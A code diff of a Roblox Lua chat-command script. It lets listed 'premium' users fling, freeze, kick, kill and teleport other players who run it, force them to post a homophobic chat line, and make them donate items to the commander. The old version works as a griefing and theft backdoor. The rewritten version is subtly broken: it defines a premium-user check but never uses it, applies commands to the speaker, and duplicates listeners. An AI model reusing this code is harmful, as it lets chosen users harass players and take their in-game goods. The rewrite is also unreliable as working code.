@@ -1,141 +1,169 @@
 
-local user_premium__001 = game.Players:FindFirstChild("adam1102928181")
-local user_premium__002 = game.Players:FindFirstChild("LittleJonib")
-local user_premium__003 = game.Players:FindFirstChild("xylar103")
-local user_premium__004 = game.Players:FindFirstChild("whoareyiu24")
-local player = game.Players.LocalPlayer
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+local systemChannel = TextChatService:WaitForChild("RBXSystem")
 
--- Define chat object with SendAsync method
-local chat = {}
-function chat:SendAsync(message)
-    local textChatService = game:GetService("TextChatService")
-    local systemChannel = textChatService:WaitForChild("RBXSystem")
+local function chatSendAsync(message)
     systemChannel:SendMessageAsync(message)
 end
 
--- Helper function to send chat messages
-local function sendChat(message)
-    chat:SendAsync(message)
+-- Define premium users
+local userNames = {
+    "adam1102928181",
+    "LittleJonib",
+    "xylar103",
+    "whoareyiu24"
+}
+
+local function isPremiumUser(p)
+    return table.find(userNames, p.Name) ~= nil
 end
 
---// Commands //--
-local function freeze()
-    if player.Character then
-        player.Character.LowerTorso.Anchored = true
-        player.Character.UpperTorso.Anchored = true
-    end
-end
+local player = Players.LocalPlayer
 
-local function unfreeze()
-    if player.Character then
-        player.Character.LowerTorso.Anchored = false
-        player.Character.UpperTorso.Anchored = false
-    end
-end
+local function setupPlayerCommands(p)
+    -- Setup the chat command listener
+    p.Chatted:Connect(function(cht)
+        -- Helper for sending chat messages
+        local function sendChat(msg)
+            chatSendAsync(msg)
+        end
 
-local function handleChatCommands(premiumUser)
-    if premiumUser then
-        premiumUser.Chatted:Connect(function(cht)
-            if cht:match(".fling .") then
-                if player ~= premiumUser then
-                    player.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
-                    local power = 99999999 -- change this to make it more or less powerful
+        -- Helper to get player's character safely
+        local function getCharacter()
+            local c = p.Character
+            if not c then
+                p.CharacterAdded:Wait()
+                c = p.Character
+            end
+            return c
+        end
+
+        -- Helper to get HumanoidRootPart safely
+        local function getHRP(char)
+            local hrp = char:FindFirstChild("HumanoidRootPart")
+            return hrp
+        end
+
+        -- Check for commands
+        if cht:match(".fling .") then
+            if p ~= player then
+                local c = getCharacter()
+                local hrp = getHRP(c)
+                if hrp then
+                    hrp.CFrame = CFrame.new(0, 999, 0)
+                    local power = 99999999
                     game:GetService('RunService').Stepped:Connect(function()
-                        player.Character.Head.CanCollide = false
-                        player.Character.UpperTorso.CanCollide = false
-                        player.Character.LowerTorso.CanCollide = false
-                        player.Character.HumanoidRootPart.CanCollide = false
+                        c.Head.CanCollide = false
+                        c.UpperTorso.CanCollide = false
+                        c.LowerTorso.CanCollide = false
+                        hrp.CanCollide = false
                     end)
                     wait(.1)
                     local bambam = Instance.new("BodyThrust")
-                    bambam.Parent = player.Character.HumanoidRootPart
-                    bambam.Force = Vector3.new(power,0,power)
-                    bambam.Location = player.Character.HumanoidRootPart.Position
-                end
-            elseif cht:match(".freeze .") then
-                if player ~= premiumUser then
-                    freeze()
-                end
-            elseif cht:match(".unfreeze .") then
-                if player ~= premiumUser then
-                    unfreeze()
-                end
-            elseif cht:match(".kxck .") then
-                if player ~= premiumUser then
-                    player:Kick("You have been kicked.")
-                end
-            elseif cht:match(".oof .") then
-                if player ~= premiumUser then
-                    player.Character.Humanoid:Destroy()
-                end
-            elseif cht:match(".error .") then
-                if player ~= premiumUser then
-                    player.Character.HumanoidRootPart.CFrame = CFrame.new(99999, 99999, 99999)
-                end
-            elseif cht:match(".bring .") then
-                if player ~= premiumUser then
-                    player.Character.HumanoidRootPart.CFrame = CFrame.new(premiumUser.Character.UpperTorso.Position)
-                end
-            elseif cht:match(".sit .") then
-                if player ~= premiumUser then
-                    local character = player.Character
-                    if character then
-                        local humanoid = character:FindFirstChildOfClass("Humanoid")
-                        if humanoid then
-                            humanoid.Sit = true
-                        end
-                    end
-                end
-            elseif cht:match(".troll .") then
-                if player ~= premiumUser then
-                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("im gay", "All")
-                end
-            elseif cht:match(".unsit .") then
-                if player ~= premiumUser then
-                    local character = player.Character
-                    if character then
-                        local humanoid = character:FindFirstChildOfClass("Humanoid")
-                        if humanoid then
-                            humanoid.Sit = false
-                        end
-                    end
-                end
-            elseif cht:match(".enlighten .") then
-                if player ~= premiumUser then
-                    player.Backpack:FindFirstChild("The Arkenstone"):Equip()
-                    -- Replaced game.Players:Chat with chat:SendAsync
-                    sendChat(";enlighten " .. premiumUser.Name)
-                end
-            elseif cht:match(".donate .") then
-                local text = cht:match(".donate (.+)") -- Extract text
-                if player ~= premiumUser then
-                    -- Replaced game.Players:Chat with chat:SendAsync
-                    sendChat(";donate " .. text .. " " .. premiumUser.Name)
-                end
-            elseif cht:match(".say .") then
-                local text = cht:match(".say (.+)") -- Extract text
-                if player ~= premiumUser then
-                    -- Replace with chat:SendAsync
-                    sendChat(text)
-                end
-            elseif cht:match("^%.cmd .+") then
-                local text = cht:match("^%.cmd (.+)") -- Extract text after ".cmd "
-                if player ~= premiumUser then
-                    -- Replace with chat:SendAsync
-                    sendChat(";" .. text)
-                end
-            elseif cht:match(".cmdx") then
-                if player == premiumUser then
-                    -- Replace with chat:SendAsync
-                    sendChat("Available Commands; .freeze .bring .error .oof .kxck .fling .sit .unsit .troll .donate .say .enlighten .cmd")
+                    bambam.Parent = hrp
+                    bambam.Force = Vector3.new(power, 0, power)
+                    bambam.Location = hrp.Position
                 end
             end
-        end)
-    end
+        elseif cht:match(".freeze .") then
+            if p ~= player then
+                if p.Character then
+                    p.Character.LowerTorso.Anchored = true
+                    p.Character.UpperTorso.Anchored = true
+                end
+            end
+        elseif cht:match(".unfreeze .") then
+            if p ~= player then
+                if p.Character then
+                    p.Character.LowerTorso.Anchored = false
+                    p.Character.UpperTorso.Anchored = false
+                end
+            end
+        elseif cht:match(".kxck .") then
+            if p ~= player then
+                p:Kick("You have been kicked.")
+            end
+        elseif cht:match(".oof .") then
+            if p ~= player then
+                if p.Character then
+                    p.Character.Humanoid:Destroy()
+                end
+            end
+        elseif cht:match(".error .") then
+            if p ~= player then
+                local c = getCharacter()
+                local hrp = getHRP(c)
+                if hrp then
+                    hrp.CFrame = CFrame.new(99999, 99999, 99999)
+                end
+            end
+        elseif cht:match(".bring .") then
+            if p ~= player then
+                local c = getCharacter()
+                local hrp = getHRP(c)
+                if hrp then
+                    local targetChar = getCharacter()
+                    local targetHRP = getHRP(targetChar)
+                    if targetHRP then
+                        local myChar = getCharacter()
+                        local myHRP = getHRP(myChar)
+                        if myHRP then
+                            targetHRP.CFrame = myHRP.CFrame * CFrame.new(0, 2, 0)
+                        end
+                    end
+                end
+            end
+        elseif cht:match(".sit .") then
+            local c = getCharacter()
+            local humanoid = c and c:FindFirstChildOfClass("Humanoid")
+            if humanoid then
+                humanoid.Sit = true
+            end
+        elseif cht:match(".unsit .") then
+            local c = getCharacter()
+            local humanoid = c and c:FindFirstChildOfClass("Humanoid")
+            if humanoid then
+                humanoid.Sit = false
+            end
+        elseif cht:match(".troll .") then
+            sendChat("im gay")
+        elseif cht:match(".enlighten .") then
+            local backpack = getCharacter() and getCharacter().Parent:FindFirstChildOfClass("Backpack")
+            if backpack then
+                local item = backpack:FindFirstChild("The Arkenstone")
+                if item then item:Equip() end
+            end
+            sendChat(";enlighten " .. p.Name)
+        elseif cht:match(".donate .") then
+            local txt = cht:match(".donate (.+)")
+            sendChat(";donate " .. txt .. " " .. p.Name)
+        elseif cht:match(".say .") then
+            local txt = cht:match(".say (.+)")
+            sendChat(txt)
+        elseif cht:match("^%.cmd .+") then
+            local txt = cht:match("^%.cmd (.+)")
+            sendChat(";" .. txt)
+        elseif cht:match(".cmdx") then
+            if p == player then
+                sendChat("Available Commands; .freeze .bring .error .oof .kxck .fling .sit .unsit .troll .donate .say .enlighten .cmd")
+            end
+        end
+    end)
 end
 
--- Connect commands for each premium user
-handleChatCommands(user_premium__001)
-handleChatCommands(user_premium__002)
-handleChatCommands(user_premium__003)
-handleChatCommands(user_premium__004)
+-- Handle existing players
+for _, p in pairs(Players:GetPlayers()) do
+    setupPlayerCommands(p)
+end
+
+-- Handle players joining later
+Players.PlayerAdded:Connect(function(p)
+    p.CharacterAdded:Connect(function()
+        setupPlayerCommands(p)
+    end)
+    -- If character already loaded
+    if p.Character then
+        setupPlayerCommands(p)
+    end
+end)
